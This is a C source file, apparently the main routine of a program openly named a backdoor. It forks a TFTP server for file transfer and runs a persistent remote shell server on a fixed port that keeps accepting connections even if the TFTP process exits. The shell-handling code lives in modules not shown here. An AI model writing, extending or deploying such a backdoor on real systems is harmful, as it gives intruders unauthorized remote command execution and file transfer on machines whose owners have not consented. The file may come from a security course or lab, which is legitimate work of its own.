#include <stdio.h>
#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <stdlib.h>

#include "common.h"
#include "shell.h"
#include "logger.h"
#include "tftp.h"
#include "backdoor.h"

#define FORK_CHILD (0)
#define FORK_FAILED (-1)
#define WAITPID_CONTINUE (0)
#define WAITPID_FAILED (-1)

/**
 * @brief Starts and runs tftp server. Server can only handle one tftp connection at a time.
 * 
 * @param server_port [in] Port for starting new tftp connections.
 * @param log_path [in] Path for log messages file.
 * @return return_code_t 
 */
static return_code_t run_tftp_server(uint32_t server_port, char *log_path)
{
    return_code_t result = RC_UNINITIALIZED;
    int32_t tftp_server_socket = -1;

    assert(NULL != log_path);

    result = logger__init_logger(log_path, LOG_INFO);
    if (RC_SUCCESS != result){
        goto l_cleanup;
    }

    result = tftp__init_server(server_port, &tftp_server_socket);
    if (RC_SUCCESS != result){
        goto l_cleanup;
    }

    result = tftp__run_server(tftp_server_socket);
    if (RC_SUCCESS != result){
        goto l_cleanup;
    }

    result = RC_SUCCESS;
l_cleanup:
    if (-1 != tftp_server_socket){
        tftp__destroy_server(&tftp_server_socket);
    }
    logger__destory_logger();

    return result;
}

int main(void)
{
    return_code_t result = RC_UNINITIALIZED;
    int32_t shell_server_socket = -1;
    pid_t tftpd_pid = -1;
    pid_t terminated_child = -1;
    int tftpd_result = -1;
    char log_message[MAX_LOG_MESSAGE_SIZE] = {0};
    bool tftpd_alive = false;

    tftpd_pid = fork();
    switch(tftpd_pid){
        case FORK_FAILED:
            handle_perror("Fork failed", RC_BACKDOOR__MAIN__FORK_FAILED);

        case FORK_CHILD:
            result = run_tftp_server(TFTP_REQUESTS_PORT, TFTP_LOG_PATH);
            exit((int)result);

        default:
            // Parent process.
            break;
    }

    tftpd_alive = true;

    result = logger__init_logger(SHELL_LOG_PATH, LOG_INFO);
    if (RC_SUCCESS != result){
        goto l_cleanup;
    }

    result = shell__init_server(SHELL_SERVER_PORT, &shell_server_socket);
    if (RC_SUCCESS != result){
        goto l_cleanup;
    }

    while (tftpd_alive){
        // Check if tftp server has died.
        terminated_child = waitpid(tftpd_pid, &tftpd_result, WNOHANG);

        switch(terminated_child){
            case WAITPID_FAILED:
                handle_perror("Waitpid failed", RC_BACKDOOR__MAIN__WAITPID_FAILED);

            case WAITPID_CONTINUE:
                result = shell__handle_new_connection(shell_server_socket);
                if (RC_SUCCESS != result){
                    goto l_cleanup;
                }
                break;

            default:
                // Tftp server has died.
                if (WIFEXITED(tftpd_result)){
                    snprintf(
                        log_message,
                        MAX_LOG_MESSAGE_SIZE,
                        "TFTP server has terminated, return code: %d",
                        WEXITSTATUS(tftpd_result)
                    );
                    logger__log(LOG_WARNING, log_message);
                }
                tftpd_alive = false;
                break;
        }
    }

    while(true){
        result = shell__handle_new_connection(shell_server_socket);
        if (RC_SUCCESS != result){
            goto l_cleanup;
        }
    }


l_cleanup:
    if (-1 != shell_server_socket){
        shell__destroy_server(&shell_server_socket);
    }
    logger__destory_logger();

    return (int)result;
}
